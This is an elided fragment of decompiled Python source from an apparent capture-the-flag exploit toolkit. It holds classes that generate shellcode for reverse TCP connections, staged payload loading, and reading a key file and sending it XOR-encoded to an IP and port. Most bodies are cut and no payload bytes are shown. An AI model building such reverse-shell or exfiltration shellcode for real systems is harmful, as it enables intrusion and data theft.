...
# [GCC 8.4.0]
# Embedded file name: /usr/local/lib/python2.7/dist-packages/expluit0/Expluit0.py
# Compiled at: 2013-07-30 12:26:21
...
class ScodeGen(object):
 ...
 DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile='sample.s'):
    ...
    def __loadScode(self):
        ...
        sCode = ('').join(opCode.decode('hex') for opCodes in opCodeList for opCode in opCodes.strip().split())
...
class PayloadLoaderScodeGen(ScodeGen):
    ...
    def __init__(self, fdNum=4, payloadSize=1024, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile='read_jump.s'):
        self.fdNum = fdNum
    ...
    def _prepareStub(self):
        ...
        stub = stub.replace('{{PAYLOAD_SIZE}}', '0x%02x' % (self.payloadSize / 256))
        open(self.asmFile, 'w').write(stub)
        os.system('as %s -o %s' % (self.asmFile, self.objFile))
        os.system('objdump -d %s > %s' % (self.objFile, self.dumpFile))
...
class ReverseConnectionScodeGen(ScodeGen):
    ...
    def __init__(self, ipAddr, portNum, platform=(
 DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile='reverse_tcp.s'):
        self.ipAddr = ipAddr
...
class ReadScodeGen(ScodeGen):
    ...
    def __init__(self, keyFile, keySize, ipAddr, portNum, xorValue=119, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile='sample.s'):
...
class SecuInsideScodeGen(ReverseConnectionScodeGen):
    ...
    def __init__(self, ipAddr, portNum, platform=(
 DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile='secuinside.s'):
    ...
    def handle(self):
        while self.isDaemon:
            ...
            if encData == '':
                conn.close()
                return
            decData = ('').join(chr(ord(ch) ^ self.xorValue) for ch in encData)
...
def toInetAddr(ipAddr):
    inetTable = [ '%02x' % int(x) for x in ipAddr.split('.') ]
    inetTable.reverse()
...
def fromInetAddr(inetAddr):
    ...
    ipAddr = ('.').join(inetTable)
    return ipAddr


def toInetPort(portNum):
    inetPort = 0
    inetPort += (portNum & 255) << 8
    inetPort += (portNum & 65280) >> 8
...
def fromInetPort(inetPort):
    ...
    portNum = 0
    portNum += (inetPortNum & 255) << 8
    portNum += (inetPortNum & 65280) >> 8
    return portNum
